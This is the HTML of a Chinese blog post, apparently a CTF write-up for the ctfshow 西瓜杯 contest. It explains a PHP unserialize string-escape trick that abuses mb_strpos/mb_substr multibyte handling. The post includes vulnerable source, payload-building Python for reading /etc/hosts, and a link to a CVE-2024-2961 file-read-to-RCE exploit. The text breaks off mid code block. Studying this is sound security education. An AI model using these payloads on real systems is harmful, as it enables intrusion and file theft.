@@ -1,0 +1,683 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ctfshow西瓜杯wp | L的博客</title><meta name="author" content="L"><meta name="copyright" content="L"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="暑假还是有点犯懒了，哎意料之中，上周ctfshow西瓜杯的题目我看了一些，感觉还是很有价值的所有复现一下。CodeInject简单闭合一下前面的就可以命令执行了\ easy_polluted和ciscn线下的python污染就不多说了 Ezzz_php这题做道了一半但是因为我是最后一天下午才打的这个比赛导致我最后虽然查道了如何将file_get_contents升级为命令执行的文章但是还是没有写出">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow西瓜杯wp">
+<meta property="og:url" content="https://lisien11.github.io/2024/07/09/ctfshow%E8%A5%BF%E7%93%9C%E6%9D%AFwp/index.html">
+<meta property="og:site_name" content="L的博客">
+<meta property="og:description" content="暑假还是有点犯懒了，哎意料之中，上周ctfshow西瓜杯的题目我看了一些，感觉还是很有价值的所有复现一下。CodeInject简单闭合一下前面的就可以命令执行了\ easy_polluted和ciscn线下的python污染就不多说了 Ezzz_php这题做道了一半但是因为我是最后一天下午才打的这个比赛导致我最后虽然查道了如何将file_get_contents升级为命令执行的文章但是还是没有写出">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/lisien11/tw/main/Cover/cover7.png">
+<meta property="article:published_time" content="2024-07-09T10:31:53.000Z">
+<meta property="article:modified_time" content="2024-09-09T05:23:34.047Z">
+<meta property="article:author" content="L">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/lisien11/tw/main/Cover/cover7.png"><link rel="shortcut icon" href="/img/1.jpg"><link rel="canonical" href="https://lisien11.github.io/2024/07/09/ctfshow%E8%A5%BF%E7%93%9C%E6%9D%AFwp/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ctfshow西瓜杯wp',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-09-09 13:23:34'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/LSE.css"><meta name="generator" content="Hexo 7.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://th.bing.com/th/id/R.8bda02900fe99b604c62102fa4c75ec9?rik=7tS3LLDyoKGywA&amp;riu=http%3a%2f%2fwww.xinjiadiy.com%2fimages%2farticle_img%2ftuwen%2f20170509%2f4525.jpg&amp;ehk=e1ROYyc3Wlh4n0HejYoZHLpkaEmkdi2lDGwD8WosTP0%3d&amp;risl=&amp;pid=ImgRaw&amp;r=0" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">66</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">33</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">37</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/lisien11/tw/main/Cover/cover7.png')"><nav id="nav"><span id="blog-info"><a href="/" title="L的博客"><span class="site-name">L的博客</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ctfshow西瓜杯wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-07-09T10:31:53.000Z" title="发表于 2024-07-09 18:31:53">2024-07-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-09-09T05:23:34.047Z" title="更新于 2024-09-09 13:23:34">2024-09-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/wp/">wp</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/wp/%E6%AF%94%E8%B5%9Bwp-%E5%A4%8D%E7%8E%B0/">比赛wp(复现)</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>23分钟</span></span><span class="post-meta-separator">|</span><span id="" data-flag-title="ctfshow西瓜杯wp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="twikoo_visitors"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="暑假还是有点犯懒了，哎意料之中，上周ctfshow西瓜杯的题目我看了一些，感觉还是很有价值的所有复现一下。"><a href="#暑假还是有点犯懒了，哎意料之中，上周ctfshow西瓜杯的题目我看了一些，感觉还是很有价值的所有复现一下。" class="headerlink" title="暑假还是有点犯懒了，哎意料之中，上周ctfshow西瓜杯的题目我看了一些，感觉还是很有价值的所有复现一下。"></a>暑假还是有点犯懒了，哎意料之中，上周ctfshow西瓜杯的题目我看了一些，感觉还是很有价值的所有复现一下。</h1><h1 id="CodeInject"><a href="#CodeInject" class="headerlink" title="CodeInject"></a>CodeInject</h1><p>简单闭合一下前面的就可以命令执行了<br><img src="/2024/07/09/ctfshow%E8%A5%BF%E7%93%9C%E6%9D%AFwp/1.png" class="" title="alt text">\</p>
+<h1 id="easy-polluted"><a href="#easy-polluted" class="headerlink" title="easy_polluted"></a>easy_polluted</h1><p>和ciscn线下的python污染就不多说了</p>
+<h1 id="Ezzz-php"><a href="#Ezzz-php" class="headerlink" title="Ezzz_php"></a>Ezzz_php</h1><p>这题做道了一半但是因为我是最后一天下午才打的这个比赛导致我最后虽然查道了如何将file_get_contents升级为命令执行的文章但是还是没有写出来</p>
+<h2 id="反序列链"><a href="#反序列链" class="headerlink" title="反序列链"></a>反序列链</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span> + <span class="number">1</span>, <span class="variable">$end</span> - <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">read_file</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$start</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start=<span class="variable">$start</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;start == <span class="string">&quot;gxngxngxn&quot;</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;What you are reading is:&#x27;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;start&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$readfile</span> = <span class="keyword">new</span> <span class="title function_ invoke__">read_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;start&#x27;</span>]);</span><br><span class="line">    <span class="variable">$read</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;read&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;read&#x27;</span>]:<span class="string">&quot;I_want_to_Read_flag&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\[|\]/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;read&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NONONO!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$read</span>.<span class="string">&quot;[&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$readfile</span>).<span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Start_Funny_CTF!!!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先审计源码我们可以发现其存在反序列入口，但是反序列的<code>$ctf</code>通过substrstr这个函数处理导致其反序列的内容于前面拼接的<code>read</code>无关这是很矛盾的，所有我们查看一下这个substrstr函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span> + <span class="number">1</span>, <span class="variable">$end</span> - <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以发现其是使用mb_strpos和mb_substr这两个函数我们先了解一下这个两个函数<br>php的内置函数像上strlen substr这样的字符处理函数其是会因为不同的编码而返回不同的值的，这是因为其处理字符是在字节层次进行的，而如果我们要使得汉字在不同的编码下处理的结果不会出现差异从而导致各种各样的问题，我们就需要使用mbstring这个扩展了。</p>
+<p>但是其mb_strpos和mb_substr在处理像<code>\xF0 \x9f</code>这种utf-8的字符会存在一些差异这也就导致了，字符串逃逸的风险<br>像题目中的substrstr函数其就使用了mb_strpos和mb_substr来截取<code>[]</code>内的字符。<br>我们先来说一下其在处时存在什么样的差异<br>这个我是看来p牛的文章才知道的。如下例子<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$start</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$end</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span> + <span class="number">1</span>, <span class="variable">$end</span> - <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$read</span>=<span class="string">&quot;\xF0\x9F[aaa123]&quot;</span>;</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">substrstr</span>(<span class="variable">$read</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br></pre></td></tr></table></figure><br>其输出为<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">8</span><br><span class="line">a123]</span><br></pre></td></tr></table></figure><br>我们可以看到虽然我们输出的<code>$start</code>和<code>$end</code>为1和8但是其并没有将键值为2到7的内容输出，这就是因为mb_subpos和mb_substr这两个函数的在处理含有utf-8字符时的区别<br>根据如上的结果我们可以发现，mb_strpos在处理<code>\xF0\x9F[</code>这种utf-8后跟着正常字符时会直接截断将已经解析的<code>\xF0\x9F</code>解析为一个字符。<br>我们都知道utf-8的一个字符是有四个字节的16进制字符组成的，而mb_substr其在处理字符时为<code>\xF0\x9F</code>是如果后面跟着非utf-8编码的字符是就和将后两个字节合并到前面的<code>\xF0\x9F</code>使其与正常的utf-8是同一大学而后在正常解析。这导致了mb_strpos会将<code>\xF0\x9F[a</code>解析为三个字符而mb_substr会将其解析为一个字符这也就导致了其字符会减少两个。这也就会导致字符串的逃逸。</p>
+<p>经过尝试我们发现了只要不断增加<code>\xF0\x9F</code>的数量即可逃逸，每个<code>\xF0\x9F\xF0\x9F</code>会被mb_strpos解析为两个字符而<code>\xF0\x9F\xF0\x9F</code>只会被mb_substr解析为一个字符这会导致字符串减少的字符串逃逸。</p>
+<p>结果尝试发现mb_strpos会直接忽略<code>\x9f</code>但是mb_substr会将其解析为一个字符。</p>
+<h3 id="一"><a href="#一" class="headerlink" title="一"></a>一</h3><p>我们解析链的构造方法首先我们肯定是要构造任意文件读取了。但是我们查看代码会发现其可控的只有read和<code>$_GET[&#39;start&#39;]</code>即<code>$start</code><br>我们想要反序列话的链子应该如下<code>O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:5:&quot;/flag&quot;;&#125;</code>，我们需要使用上面提到的宽字符逃逸的方法来将我们构造的链子逃逸出去。我们将链子直接赋值给start得到的<code>$ctf</code>为<code>O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:75:&quot;O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:5:&quot;/flag&quot;;&#125;&quot;;s:8:&quot;filename&quot;;s:5:&quot;/flag&quot;;&#125;</code>更加我们上面提到的每增加一个<code>\xF0\x9F\xF0\x9F</code>后续字符在经过处理后就会被吞掉一个字符。那么我们只要在<code>[</code>前面加上37个<code>\xF0\x9F\xF0\x9F</code>就可使得<code>$ctf</code>变为<code>O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:5:&quot;/flag&quot;;&#125;&quot;;s:8:&quot;filename&quot;;s:5:&quot;/flag&quot;;&#125;]</code>即我们将链子逃逸了出去。<br>所以只要给read传37个<code>\xF0\x9F\xF0\x9F</code>即可逃逸成功。</p>
+<h2 id="二"><a href="#二" class="headerlink" title="二"></a>二</h2><p>通过%9f也可以来构造链子<br>同样我们要构造<code>O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:5:&quot;/flag&quot;;&#125;</code>其但是由于%9f会使得截取范围算是前移。即如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$start</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$end</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span> + <span class="number">1</span>, <span class="variable">$end</span> - <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$read</span>=<span class="string">&quot;\x9f\x9f\x9f\x9f\x9f1111[aaaa]&quot;</span>;</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">substrstr</span>(<span class="variable">$read</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br></pre></td></tr></table></figure><br>输出<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">9</span><br><span class="line">1111</span><br></pre></td></tr></table></figure><br>假设1111为我们要使用的payload，那么我们可以发现只要将截取的内容前移payload长度+1个字符就可以成功逃逸，二括号内的内容长度要大于payload的长度。<br>即我们可以构造如下脚本<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">path=<span class="string">&quot;/etc/hosts&quot;</span></span><br><span class="line">payload_file=<span class="string">&#x27;O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(path))+<span class="string">&#x27;:&quot;&#x27;</span>+path+<span class="string">&#x27;&quot;;&#125;&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;%9f&#x27;</span>*(<span class="built_in">len</span>(payload_file)+<span class="number">1</span>)+payload_file.replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;%2b&quot;</span>)</span><br><span class="line">start=<span class="string">&quot;a&quot;</span>*(<span class="built_in">len</span>(payload_file)+<span class="number">11</span>)</span><br><span class="line">url=<span class="string">&quot;https://d34019c5-7d46-48e6-bed4-de3459da6865.challenge.ctf.show/&quot;</span>+<span class="string">f&quot;?start=<span class="subst">&#123;start&#125;</span>&amp;read=<span class="subst">&#123;payload&#125;</span>&quot;</span></span><br><span class="line">req=requests.get(url)</span><br><span class="line"><span class="built_in">print</span>(req.text</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>但是虽然可以文件读取但是并不知道文件的名字为什么。所以我们需要rce</p>
+<h2 id="CVE-2024-2961：将phpfilter任意文件读取提升为远程代码执行"><a href="#CVE-2024-2961：将phpfilter任意文件读取提升为远程代码执行" class="headerlink" title="CVE-2024-2961：将phpfilter任意文件读取提升为远程代码执行"></a>CVE-2024-2961：将phpfilter任意文件读取提升为远程代码执行</h2><p>参考:<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14690">https://xz.aliyun.com/t/14690</a></p>
+<p>原作者给出的exp:<br><a target="_blank" rel="noopener" href="https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py">https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py</a></p>
+<p>因为这个是利用了glibc的我不懂应该是属于pwn的范围的所以我就当个脚本小子即可</p>
+<p>虽然有exp但是我们还需要进行小小的修改如下<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 